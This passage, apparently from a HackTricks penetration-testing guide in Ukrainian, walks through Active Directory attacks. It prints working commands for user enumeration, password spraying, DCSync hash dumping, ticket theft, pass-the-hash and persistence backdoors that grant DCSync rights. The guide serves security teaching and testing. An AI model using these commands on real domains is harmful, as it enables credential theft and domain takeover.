# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Базовий огляд

**Active Directory** слугує базовою технологією, яка дозволяє мережевим адміністраторам ефективно створювати та керувати **доменами**, **користувачами** та **об'єктами** в мережі. Вона спроєктована для масштабування, дозволяючи організувати велику кількість користувачів у керовані **групи** та **підгрупи**, одночасно контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних шарів: **доменів**, **дерев** та **лісів**. **Домен** охоплює збірку об'єктів, таких як **користувачі** або **пристрої**, які використовують спільну базу даних. **Дерева** — це групи таких доменів, пов'язаних спільною структурою, а **ліс** представляє собою колекцію кількох дерев, з'єднаних через **trust relationships**, формуючи найвищий рівень організаційної структури. На кожному з цих рівнів можна визначати конкретні **права доступу** та **права на комунікацію**.

Ключові поняття в **Active Directory** включають:

1. **Directory** – Містить всю інформацію про об'єкти Active Directory.
2. **Object** – Позначає сутності в каталозі, включаючи **користувачів**, **групи** або **спільні папки**.
3. **Domain** – Служить контейнером для об'єктів каталогу; у **forest** може існувати кілька доменів, кожен зі своєю колекцією об'єктів.
4. **Tree** – Групування доменів, що ділять спільний root domain.
5. **Forest** – Верхівка організаційної структури в Active Directory, що складається з кількох дерев із взаємними **trust relationships**.

**Active Directory Domain Services (AD DS)** охоплює ряд сервісів, критичних для централізованого управління та комунікації в мережі. До цих сервісів належать:

1. **Domain Services** – Централізує зберігання даних та керує взаємодією між **користувачами** і **доменами**, включно з **authentication** та функціями пошуку.
2. **Certificate Services** – Керує створенням, розповсюдженням та управлінням цифровими **сертифікатами**.
3. **Lightweight Directory Services** – Підтримує додатки, що використовують каталог, через **LDAP protocol**.
4. **Directory Federation Services** – Забезпечує можливість **single-sign-on** для автентифікації користувачів між кількома веб-додатками в одній сесії.
5. **Rights Management** – Допомагає захищати авторські матеріали, контролюючи їх несанкціоноване поширення та використання.
6. **DNS Service** – Критично важливий для розвʼязання **domain names**.

Для більш детального пояснення див.: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Щоб навчитися атакувати **AD**, вам потрібно дуже добре розуміти процес **Kerberos authentication**.\
[**Прочитайте цю сторінку, якщо ви досі не знаєте, як це працює.**](kerberos-authentication.md)

## Шпаргалка

Ви можете зайти на [https://wadcoms.github.io/](https://wadcoms.github.io) щоб швидко подивитися, які команди можна виконувати для перерахування/експлуатації AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** для виконання дій. Якщо ви намагаєтесь отримати доступ до машини за IP-адресою, **використовуватиметься NTLM, а не kerberos**.

## Recon Active Directory (No creds/sessions)

Якщо у вас є доступ до середовища AD, але немає облікових даних/сесій, ви можете:

- **Pentest the network:**
- Скануйте мережу, знайдіть машини та відкриті порти і спробуйте **exploit vulnerabilities** або **extract credentials** з них (наприклад, [printers could be very interesting targets](ad-information-in-printers.md)).
- Перерахування DNS може дати інформацію про ключові сервери в домені, такі як web, printers, shares, vpn, media тощо.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ознайомтеся з загальною [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) щоб знайти більше інформації про те, як це робити.
- **Check for null and Guest access on smb services** (це не працюватиме на сучасних версіях Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Детальніший гайд про те, як перерахувати SMB сервер, можна знайти тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Детальніший гайд з перерахування LDAP можна знайти тут (зверніть **особливу увагу на anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Збирайте облікові дані, **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Отримуйте доступ до хосту, **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Збирайте облікові дані, **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Витягайте імена користувачів/імена зі внутрішніх документів, соціальних мереж, сервісів (головним чином web) всередині доменних середовищ та з публічно доступних джерел.
- Якщо ви знайдете повні імена співробітників компанії, ви можете спробувати різні конвенції імен користувачів AD (**read this**). Найпоширеніші конвенції: _NameSurname_, _Name.Surname_, _NamSur_ (3 літери від кожного), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Інструменти:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Перерахування користувачів

- **Anonymous SMB/LDAP enum:** Див. сторінки з [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) та [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Коли запитується **invalid username**, сервер відповість з кодом помилки **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дозволяє визначити неправильне ім'я користувача. **Valid usernames** викличуть або **TGT in a AS-REP** відповідь, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, що вказує, що користувачеві потрібна pre-authentication.
- **No Authentication against MS-NRPC**: Використання auth-level = 1 (No authentication) проти MS-NRPC (Netlogon) інтерфейсу на domain controllers. Метод викликає функцію `DsrGetDcNameEx2` після биндингу MS-NRPC інтерфейсу, щоб перевірити, чи існує користувач або комп'ютер без жодних облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує цей тип перерахування. Дослідження можна знайти [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf).
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Якщо ви знайдете один із таких серверів у мережі, ви також можете виконати **user enumeration against it**. Наприклад, ви можете використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Ви можете знайти списки імен користувачів у [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  та в цьому ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Проте ви повинні мати **імена людей, які працюють у компанії** з етапу recon, який ви мали виконати раніше. Маючи ім'я та прізвище, ви можете використати скрипт [**namemash.py**](https://gist.github.com/superkojiman/11076951) для генерації потенційних валідних імен користувачів.

### Якщо відоме одне або кілька імен користувачів

Отже, ви вже знаєте, що маєте дійсне ім'я користувача, але немає паролів... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо користувач **doesn't have** атрибут _DONT_REQ_PREAUTH_, ви можете **request a AS_REP message** для цього користувача, яке міститиме деякі дані, зашифровані похідною від пароля користувача.
- [**Password Spraying**](password-spraying.md): Спробуйте найбільш **поширені паролі** для кожного виявленого користувача; можливо, хтось використовує слабкий пароль (пам'ятайте про політику паролів!).
- Зверніть увагу, що ви також можете **spray OWA servers**, щоб спробувати отримати доступ до поштових серверів користувачів.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ви можете отримати деякі challenge hashes для crack-у, виконуючи poisoning деяких протоколів мережі:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Якщо вам вдалося перелічити Active Directory, у вас буде **більше emails та краще розуміння мережі**. Можливо, ви зможете примусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) для отримання доступу до AD env.

### NetExec workspace-driven recon & relay posture checks

- Використовуйте **`nxcdb` workspaces** для збереження стану AD recon по кожному engagement: `workspace create <name>` створює per-protocol SQLite DBs у `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Перемикайте вигляди за допомогою `proto smb|mssql|winrm` і переглядайте зібрані облікові дані командою `creds`. Після завершення вручну видаліть чутливі дані: `rm -rf ~/.nxc/workspaces/<name>`.
- Швидке виявлення підмережі за допомогою **`netexec smb <cidr>`** показує **domain**, **OS build**, **SMB signing requirements** і **Null Auth**. Хости, що вказують `(signing:False)`, є **relay-prone**, тоді як DC часто вимагають signing.
- Згенеруйте **hostnames in /etc/hosts** безпосередньо з виводу NetExec для полегшення таргетингу:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- When **SMB relay to the DC is blocked** by signing, still probe **LDAP** posture: `netexec ldap <dc>` highlights `(signing:None)` / weak channel binding. A DC with SMB signing required but LDAP signing disabled remains a viable **relay-to-LDAP** target for abuses like **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Інтерфейси принтерів/веб-UI іноді **вбудовують заховані паролі адміністратора в HTML**. Перегляд коду сторінки/інструментів розробника може виявити їх у відкритому тексті (наприклад, `<input value="<password>">`), що дозволяє доступ через Basic-auth до репозиторіїв сканів/друку.
- Отримані завдання друку можуть містити **документи onboarding у відкритому тексті** з паролями для кожного користувача. Під час тестування зберігайте відповідність пар:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Вкрасти NTLM Creds

Якщо ви можете **access other PCs or shares** з користувачем **null or guest user**, ви можете **place files** (наприклад SCF file), які при доступі викличуть t**rigger an NTLM authentication against you**, щоб ви могли **steal** **NTLM challenge** і зламати його:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** трактує кожен NT hash, який у вас вже є, як кандидат-пароль для інших, повільніших форматів, ключовий матеріал яких походить безпосередньо з NT hash. Замість brute-forcing довгих passphrases у Kerberos RC4 tickets, NetNTLM challenges або cached credentials, ви подаєте NT hashes у Hashcat’s NT-candidate modes і даєте йому перевірити повторне використання пароля, не дізнаючись plaintext. Це особливо ефективно після domain compromise, коли можна зібрати тисячі поточних і історичних NT hashes.

Use shucking when:

- Ви маєте NT corpus з DCSync, SAM/SECURITY dumps або credential vaults і потрібно перевірити повторне використання в інших доменах/forests.
- Ви захоплюєте RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses або DCC/DCC2 blobs.
- Ви хочете швидко підтвердити reuse для довгих, важко зламуваних passphrases і негайно pivot через Pass-the-Hash.

Техніка **does not work** проти encryption types, ключі яких не є NT hash (наприклад Kerberos etype 17/18 AES). Якщо домен примушує AES-only, потрібно повернутись до звичайних password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history щоб зібрати якомога більший набір NT hashes (та їхні попередні значення):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Записи history значно розширюють пул кандидатів, бо Microsoft може зберігати до 24 попередніх hash на обліковий запис. Для інших способів збору NTDS secrets див.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує local SAM/SECURITY дані і cached domain logons (DCC/DCC2). Уніфікуйте і додайте ті хеші до того самого `nt_candidates.txt`.
- **Track metadata** – Зберігайте username/domain, що породив кожен hash (навіть якщо словник містить лише hex). Відповідні хеші одразу покажуть, який principal повторно використовує пароль, щойно Hashcat виведе переможний кандидат.
- Віддавайте перевагу кандидатам з того самого forest або trusted forest; це максимізує шанси overlap під час shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Примітки:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Вимкніть rule engines (без `-r`, без hybrid modes), бо mangling пошкоджує candidate key material.
- Ці режими не обов’язково швидші, але NTLM keyspace (~30,000 MH/s на M3 Max) ~100× швидший ніж Kerberos RC4 (~300 MH/s). Тестування кураторського NT списку значно дешевше, ніж дослідження всього password space у повільному форматі.
- Завжди використовуйте **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`), бо режими 31500/31600/35300/35400 з’явилися недавно.
- Наразі немає NT mode для AS-REQ Pre-Auth, і AES etypes (19600/19700) вимагають plaintext пароля, бо їхні ключі виводяться через PBKDF2 від UTF-16LE passwords, а не від raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS для цільового SPN за допомогою low-privileged user (деталі на сторінці Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket за допомогою вашого NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key з кожного NT candidate і валідовує `$krb5tgs$23$...` blob. Збіг підтверджує, що service account використовує один з ваших існуючих NT hashes.

3. Негайно pivot через PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

За потреби ви можете опціонально відновити plaintext пізніше з `hashcat -m 1000 <matched_hash> wordlists/`.

#### Example – Cached credentials (mode 31600)

1. Здампте cached logons з скомпрометованої робочої станції:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Скопіюйте DCC2 рядок для цікавого domain user в `dcc2_highpriv.txt` і shuck-ніть його:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Успішний збіг дає NT hash, вже відомий у вашому списку, що підтверджує, що cached user повторно використовує пароль. Використайте його напряму для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або bruteforce в швидкому NTLM режимі для відновлення рядка.

Точні ті ж кроки застосовуються до NetNTLM challenge-responses (`-m 27000/27100`) і DCC (`-m 31500`). Після виявлення збігу ви можете запускати relay, SMB/WMI/WinRM PtH або повторно crack NT hash з masks/rules офлайн.

## Перелічення Active Directory WITH credentials/session

Для цієї фази вам потрібно мати **compromised the credentials or a session of a valid domain account.** Якщо у вас є якісь валідні credentials або shell як domain user, **майте на увазі, що попередні опції все ще залишаються шляхами для compromise інших користувачів.**

Перед тим як починати authenticated enumeration, вам слід знати про **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Наявність скомпрометованого облікового запису — це **великий крок для початку compromise всього домену**, оскільки ви зможете розпочати **Active Directory Enumeration:**

Що стосується [**ASREPRoast**](asreproast.md), ви тепер можете знайти всіх можливих вразливих користувачів, а щодо [**Password Spraying**](password-spraying.md) — отримати **список усіх імен користувачів** і спробувати пароль скомпрометованого облікового запису, пусті паролі та нові перспективні паролі.

- Ви можете використати [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використовувати [**powershell for recon**](../basic-powershell-for-pentesters/index.html), що буде stealthier
- Також можна [**use powerview**](../basic-powershell-for-pentesters/powerview.md) для витягу більш детальної інформації
- Ще один чудовий інструмент для recon в Active Directory — [**BloodHound**](bloodhound.md). Він **не дуже stealthy** (залежить від методів collection), але **якщо вам це не важливо**, варто спробувати. Знайдіть де користувачі можуть RDP, знайдіть шляхи до інших груп і т.д.
- **Інші автоматизовані AD enumeration інструменти:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) — можуть містити цікаву інформацію.
- Інструмент з GUI для перелічення директорії — **AdExplorer.exe** з **SysInternal** Suite.
- Також можна шукати в LDAP базі за допомогою **ldapsearch**, щоб знайти credentials у полях _userPassword_ & _unixUserPassword_, або навіть у _Description_. Див. також [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) для інших методів.
- Якщо ви використовуєте **Linux**, також можна перелічити домен за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Можна також спробувати автоматизовані інструменти:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Дуже легко отримати всі імена користувачів домену з Windows (`net user /domain`, `Get-DomainUser` або `wmic useraccount get name,sid`). В Linux можна використовувати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Навіть якщо цей розділ Enumeration виглядає коротким, це найважливіша частина. Перейдіть за посиланнями (особливо за cmd, powershell, powerview і BloodHound), навчіться перелічувати домен і практикуйтеся, поки не відчуєте себе впевнено. Під час оцінки це буде ключовий момент, щоб знайти шлях до DA або вирішити, що нічого не вийде зробити.

### Kerberoast

Kerberoasting включає отримання **TGS tickets**, що використовуються сервісами, прив’язаними до user accounts, і cracking їхнього шифрування — яке базується на user passwords — **офлайн**.

Детальніше в:

{{#ref}}
kerberoast.md
{{#endref}}

### Віддалене підключення (RDP, SSH, FTP, Win-RM, etc)

Щойно ви отримали якісь credentials, можна перевірити, чи маєте доступ до якоїсь **machine**. Для цього можна використати **CrackMapExec** для спроб підключення до кількох серверів різними протоколами відповідно до вашого port scan.

### Local Privilege Escalation

Якщо у вас є compromised credentials або session як звичайний domain user і ви маєте **access** цим користувачем до **будь-якої машини в домені**, слід спробувати escalate privileges локально і loot credentials. Лише з local administrator privileges ви зможете **dump hashes інших користувачів** з пам’яті (LSASS) і локально (SAM).

У цій книзі є повна сторінка про [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) і [**checklist**](../checklist-windows-privilege-escalation.md). Також не забувайте про [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Дуже **малоймовірно**, що ви знайдете **tickets** в поточного користувача, які дають вам permission to access несподівані ресурси, але варто перевірити:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Якщо вам вдалося виконати енумерацію Active Directory, у вас буде **більше електронних адрес і краще розуміння мережі**. Можливо, ви зможете примусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Тепер, коли у вас є базові облікові дані, варто перевірити, чи можете ви **знайти** які-небудь **цікаві файли, що розшарені всередині AD**. Можна робити це вручну, але це дуже нудна повторювана робота (а тим більше, якщо знайдете сотні документів, які потрібно перевірити).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Якщо ви можете **access other PCs or shares** ви можете **place files** (наприклад SCF файл), які, якщо ними хтось скористається, спричинять **NTLM authentication against you**, тож ви зможете **steal** **NTLM challenge** для його зламу:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому автентифікованому користувачу **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Для наведених нижче технік звичайного доменного користувача замало — потрібні спеціальні привілеї/облікові дані для виконання цих атак.**

### Hash extraction

Сподіваюсь, вам вдалося **compromise some local admin** account, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Потім настав час дампити всі хеші з пам'яті та локально.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Потрібно використовувати якийсь **tool**, що **виконає** **NTLM authentication using** that **hash**, **or** ви можете створити новий **sessionlogon** та **inject** цей **hash** в **LSASS**, тож коли відбуватиметься будь-яка **NTLM authentication**, цей **hash** буде використано. Останній варіант — саме те, що робить mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака має на меті **use the user NTLM hash to request Kerberos tickets**, як альтернативу звичному Pass The Hash через NTLM протокол. Тому це може бути особливо **useful in networks where NTLM protocol is disabled** і дозволено лише **Kerberos** як протокол автентифікації.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Якщо у вас є **hash** або **password** локального **administrator**, ви маєте спробувати **login locally** на інші **PCs** з їх допомогою.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зверніть увагу, що це досить **шумно**, і **LAPS** може це **пом'якшити**.

### MSSQL Abuse & Trusted Links

Якщо користувач має привілеї для **доступу до MSSQL інстансів**, він може використати це, щоб **виконувати команди** на хості MSSQL (якщо процес працює під SA), **вкрасти** NetNTLM **hash** або навіть виконати **relay attack**.\
Також, якщо MSSQL інстанс є довіреним (database link) для іншого MSSQL інстансу, і користувач має привілеї над довіреною базою даних, він зможе **використати довірчі відносини, щоб виконувати запити також в іншому інстансі**. Ці довіри можна ланцюжити, і в певний момент користувач може знайти неправильно налаштовану базу даних, де зможе виконувати команди.\
**Зв'язки між базами даних працюють навіть через forest trusts.**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Сторонні рішення для інвентаризації та розгортання часто надають потужні шляхи до облікових даних і виконання коду. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете будь-який Computer об'єкт з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і у вас є доменні привілеї на цьому комп'ютері, ви зможете дампити TGTs з пам'яті всіх користувачів, які входять на цей комп'ютер.\
Отже, якщо **Domain Admin** увійде на цей комп'ютер, ви зможете дампнути його TGT і видавати себе за нього за допомогою [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть можете **автоматично скомпрометувати Print Server** (сподіваюсь, це буде DC).

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувач або комп'ютер дозволені для "Constrained Delegation", вони зможуть **представляти будь-якого користувача для доступу до певних сервісів на комп'ютері**.\
Якщо ви **скомпрометуєте hash** цього користувача/комп'ютера, ви зможете **представляти будь-якого користувача** (навіть domain admins) для доступу до цих сервісів.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Маючи привілей **WRITE** над Active Directory об'єктом віддаленого комп'ютера, можна досягти виконання коду з **підвищеними привілеями**:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Скомпрометований користувач може мати деякі **цікаві привілеї над об'єктами домену**, які дозволять вам пізніше **рухатися латерально** або **ескалювати** привілеї.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Виявлення **Spool service, що слухає** в межах домену може бути **зловживано** для **отримання нових облікових даних** та **ескалації привілеїв**.

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Якщо **інші користувачі** **доступаються** до **скомпрометованої** машини, можливо **зібрати облікові дані з пам'яті** та навіть **інжектувати beacons у їхні процеси**, щоб видавати себе за них.\
Зазвичай користувачі підключаються через RDP, тому тут показано, як виконати кілька атак над сесіями третіх сторін RDP:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** надає систему керування **локальним паролем Administrator** на машинах, приєднаних до домену, забезпечуючи його **рандомізацію**, унікальність і часту **зміну**. Ці паролі зберігаються в Active Directory, а доступ контролюється через ACL лише для авторизованих користувачів. Маючи достатні дозволи для доступу до цих паролів, можлива переорієнтація на інші комп'ютери.

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Отримання сертифікатів** зі скомпрометованої машини може стати способом ескалації привілеїв у середовищі:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Якщо налаштовані **вразливі шаблони**, їх можна зловживати для ескалації привілеїв:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Як тільки ви отримаєте **Domain Admin** або ще краще **Enterprise Admin** привілеї, ви можете **дампити** **базу даних домену**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Деякі з технік, описаних раніше, можуть бути використані для персистенції.\
Наприклад, ви можете:

- Зробити користувачів вразливими до [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити користувачів вразливими до [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати привілеї [**DCSync**](#dcsync) користувачу

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Атака **Silver Ticket** створює **легітимний TGS (Ticket Granting Service) ticket** для конкретного сервісу, використовуючи **NTLM hash** (наприклад, **hash облікового запису ПК**). Цей метод використовується для отримання прав доступу до сервісу.

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Атака **Golden Ticket** передбачає отримання атакуючим **NTLM hash** облікового запису krbtgt в Active Directory середовищі. Цей обліковий запис використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, які необхідні для аутентифікації в мережі AD.

Після отримання цього hash, нападник може створювати **TGTs** для будь-якого облікового запису (що схоже на Silver ticket attack).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це схожі на golden tickets квитки, підроблені таким чином, щоб **обійти звичайні механізми виявлення golden tickets.**

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

